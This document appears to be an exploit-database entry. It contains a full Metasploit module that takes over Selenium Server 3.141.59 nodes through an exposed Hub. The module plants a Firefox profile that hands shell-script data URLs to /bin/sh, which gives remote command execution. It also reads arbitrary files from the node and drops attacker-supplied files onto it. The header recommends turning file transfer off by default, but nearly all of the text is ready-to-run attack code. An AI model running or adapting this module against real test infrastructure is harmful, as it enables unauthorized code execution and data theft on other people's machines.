# Exploit Title: Selenium Node Takeover Kit
# Date: 11/??/2021
# Exploit Author: Jon Statton
# Vendor Homepage: https://www.selenium.dev/
# Software Link: https://selenium-release.storage.googleapis.com/3.141/selenium-server-standalone-3.141.59.jar
# Version: 3.141.59
# Tested on: 3.141.59 + Firefox(geckodriver)

# I think the download and upload of files on a Selenium Node should be turned off by default on the Hub level. It should be something that has to be turned on explicitly, maybe with some type of authorization.

# DESCRIPTION: Basically a minimal version of Selenium Node Download. Rather than try build an inline HTML form, this just loads the file like “file:///tmp/blah.txt” and dumps the loaded page. This is useful for like small text files, and just for testing interaction with the file-system on a Selenium Node.

# INSTALL: To install, copy this to "~/.msf4/modules/exploits/multi/http/" or whatever.

# RUN: Set "URL" to the HUB URL (Should look like http://selenium-hub.lan:4444/wd/hub). Set "COMMAND_TYPE" to upload, download, or command. The set the other arguments as needed.

require 'json'
require 'zip'
require 'base64'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      'Name'           => 'Selenium Node Takeover Kit',
      'Description'    => %q{
        Use the browser(Firefox) on a Selenium Node to cat a file.
        Basically it uses the browser to load a text file into the browser
        then it dumps the page text.
      },
      'License'        => MSF_LICENSE,
      'Author'         => [ 'Jon Stratton' ],
      'References'     =>
        [
          [ 'URL', 'https://github.com/JonStratton/selenium-node-takeover-kit' ]
        ],
      'Platform'       => 'misc',
      'Targets'       => [
        [
          'Native Payload', {
            'Platform' => %w{ linux osx win unix },
            'Arch'     => ARCH_ALL
          }
        ]
      ],
      'DisclosureDate' => "Oct ?? 2020",
      'DefaultTarget'  => 0))

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The Selenium Hub URL.', '/wd/hub']),
        OptString.new('REMOTE_FILE', [false, 'The remote file be uploaded to, downloaded from, or catted.']),
        OptString.new('LOCAL_FILE', [false, 'The local file to be uploaded or downloaded too.']),
        OptString.new('BROWSER', [false, 'The BrowserName to use.', 'firefox']),
        OptString.new('SHELL_COMMAND', [false, 'The shell command to execute', 'rm $0; echo success > /tmp/selenium_node_rce.txt']),
        OptString.new('COMMAND_TYPE', [false, 'upload/download/command', 'command'])
      ])
  end

  def check_options
    remote_file = datastore['REMOTE_FILE']
    local_file = datastore['LOCAL_FILE']
    browser = datastore['BROWSER']
    shell_command = datastore['SHELL_COMMAND']
    command_type = datastore['COMMAND_TYPE']

    unless ['upload', 'download', 'command'].include? command_type
      fail_with(Failure::BadConfig, 'COMMAND_TYPE must be upload, download, or command')
    end

    if ['upload', 'command'].include? command_type and browser != 'firefox'
      fail_with(Failure::BadConfig, 'upload and command only (currently) work with firefox')
    end

    if command_type == 'upload' and (remote_file.empty? or local_file.empty?)
      fail_with(Failure::BadConfig, 'To use upload, you must set REMOTE_FILE and LOCAL_FILE')
    end

    if command_type == 'download' and remote_file.empty?
      fail_with(Failure::BadConfig, 'To use download, you must set REMOTE_FILE')
    end
  end

  def exploit
    command_type = datastore['COMMAND_TYPE']

    check_options

    sessionId = start_session

    if command_type == 'command'
      rce_firefox sessionId
    elsif command_type == 'download'
      download sessionId
    else
      upload_firefox sessionId
    end

    end_session sessionId
  end

  def start_session
    browser = datastore['BROWSER']
    command_type = datastore['COMMAND_TYPE']
    remote_file = datastore['REMOTE_FILE']

    desiredCapabilities = JSON.generate({:desiredCapabilities => {:browserName => browser}})

    # If upload or command, build a firefox profile (which is a zip file)
    if ['upload', 'command'].include? command_type
      # Build profile zip file.
      stringio = Zip::OutputStream::write_buffer do |io|

        if command_type == 'command' # Create a handler for shell scripts
          io.put_next_entry("handlers.json")
          io.write('{"defaultHandlersVersion":{"en-US":4},"mimeTypes":{"application/sh":{"action":2,"handlers":[{"name":"sh","path":"/bin/sh"}]}}}')

        elsif command_type == 'upload' # Allows us to download files without being prompted.
          io.put_next_entry("prefs.js")
          io.write('user_pref("browser.download.dir", "%s");
user_pref("browser.download.folderList", 2);
user_pref("browser.helperApps.neverAsk.saveToDisk", "application/octet-stream;");' % [File::dirname(remote_file)])
        end

      end
      stringio.rewind
      encoded_profile = Base64.strict_encode64(stringio.sysread)
      desiredCapabilities = JSON.generate({:desiredCapabilities => {:browserName => browser, :firefox_profile => encoded_profile}})
    end

    # Start session. driver = Selenium::WebDriver.for :remote, :url => url, :desired_capabilities => { :browserName => browser }
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'session'),
      'ctype'  => 'application/json; charset=utf-8',
      'data'   => desiredCapabilities
    })
    sessionId = res.get_json_document["value"]["sessionId"] ? res.get_json_document["value"]["sessionId"] : res.get_json_document["sessionId"]

    unless sessionId
      fail_with(Failure::NotFound, "Failed to start session.")
    end
    print_good("Created Session: #{sessionId}")

    return sessionId
  end

  def end_session (sessionId)
    res = send_request_cgi({
      'method' => 'DELETE',
      'uri' => normalize_uri(target_uri.path, 'session', sessionId)
    }, nil)
  end

  def rce_firefox (sessionId)
    shell_command = datastore['SHELL_COMMAND']

    data_url = "data:application/sh;charset=utf-16le;base64,%s" % [Base64.encode64(shell_command)]

    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'session', sessionId, 'url'),
      'ctype'  => 'application/json; charset=utf-8',
      'data'   => JSON.generate({:url => data_url})
    }, nil)
  end

  def download (sessionId)
    remote_file = datastore['REMOTE_FILE']
    local_file = datastore['LOCAL_FILE']

    #driver.get(...)
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'session', sessionId, 'url'),
      'ctype'  => 'application/json; charset=utf-8',
      'data'   => JSON.generate({:url => 'data:text/html;charset=utf-8,<html><input id=f type=file onchange="rf(event)"><script>var inf; var rf = function(e) { var inp = e.target; var read = new FileReader(); read.onload = function(){inf = read.result;}; read.readAsDataURL(inp.files[0]);}</script></html>'})
    })

    #driver.find_element(id: 'f').send_keys(remote_file)
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'session', sessionId, 'element'),
      'ctype'  => 'application/json; charset=utf-8',
      'data'   => JSON.generate({:using => 'css selector', :value => '#f'})
    })
    elementId = res.get_json_document["value"].values[0]

    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'session', sessionId, 'element', elementId, 'value'),
      'ctype'  => 'application/json; charset=utf-8',
      'data'   => JSON.generate({:text => remote_file, :value => remote_file.split()})
    })

    # js_return = driver.execute_script('return(inf)')   # Dump the contents of "inf"
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'session', sessionId, 'execute', 'sync'),
      'ctype'  => 'application/json; charset=utf-8',
      'data'   => JSON.generate({:args => [], :script => "return(inf)"})
    })
    decoded_contents = Base64.decode64(res.get_json_document["value"].split(',')[1])

    if local_file
      File.open(local_file, 'wb') do |f|
        f.write(decoded_contents)
      end
    else
      print(decoded_contents)
    end
  end

  def upload_firefox (sessionId)
    remote_file = datastore['REMOTE_FILE']
    local_file = datastore['LOCAL_FILE']

    href = 'data:application/octet-stream;charset=utf-16le;base64,%s' % [Base64.encode64( File.read(local_file) )]
    data_url = 'data:text/html;charset=utf-8,<html><a id=f href="%s" download="%s">f</a></html>' % [href, File::basename(remote_file)]

    # URL.
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'session', sessionId, 'url'),
      'ctype'  => 'application/json; charset=utf-8',
      'data'   => JSON.generate({:url => data_url})
    })

    # Element.
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'session', sessionId, 'element'),
      'ctype'  => 'application/json; charset=utf-8',
      'data'   => JSON.generate({:using => 'css selector', :value => '#f'})
    })
    elementId = res.get_json_document["value"].values[0]

    # Element Click.
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'session', sessionId, 'element', elementId, 'click'),
      'ctype'  => 'application/json; charset=utf-8',
      'data'   => JSON.generate({})
    })
  end
end
